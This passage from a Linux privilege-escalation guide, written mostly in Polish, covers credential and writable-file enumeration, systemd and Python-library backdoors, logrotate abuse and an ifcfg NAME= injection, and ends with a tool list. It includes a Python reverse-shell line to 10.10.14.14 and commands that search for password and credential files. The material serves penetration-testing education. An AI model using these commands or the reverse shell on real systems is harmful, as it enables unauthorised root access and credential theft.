find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat znajdujący się w /etc/systemd/,** to możesz zmienić następujące linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcat.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB pliki
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on wyszukuje **wiele możliwych plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem**, którego możesz użyć do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym bardziej będzie on interesujący (prawdopodobnie).\
Ponadto niektóre **źle** skonfigurowane (backdoored?) **logi audytu** mogą pozwolić ci na **zapisanie haseł** w logach audytu, jak wyjaśniono w tym poście: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi grupy** [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie naprawdę pomocna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub wewnątrz **zawartości**, a także sprawdzić IPs i emails w logach, albo hashes regexps.\
Nie będę tu opisywał, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, skąd będzie wykonywany skrypt python i **możesz zapisywać** w tym folderze lub możesz **modyfikować python libraries**, możesz zmodyfikować OS library i zaszyć w niej backdoor (jeśli możesz zapisywać tam, gdzie będzie wykonywany skrypt python, skopiuj i wklej bibliotekę os.py).

Aby **backdoor the library** po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> Ta podatność dotyczy `logrotate` w wersji `3.18.0` i starszych

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. **Jeśli w NAME= znajduje się spacja, system próbuje wykonać część po tej spacji.** This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zauważ pustą spację między Network i /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart` i czasami `reload` usług. Mogą być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym systemem **zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny init i menedżer usług, oferując zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automountami i migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz w `/etc/systemd/system/` dla modyfikacji administratora, upraszczając administrację systemem.

## Inne techniki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki do rootowania Androida często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autoryzacja menedżera (np. sprawdzanie podpisu oparte na FD-order lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej i zobacz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery w VMware Tools/Aria Operations może wyciągnąć ścieżkę binarki z linii poleceń procesu i wykonać ją z -v w uprzywilejowanym kontekście. Permisywne wzorce (np. używające \S) mogą dopasować listenery podstawione przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), co prowadzi do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny w innych stosach discovery/monitoringu tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Mechanizmy zabezpieczeń jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
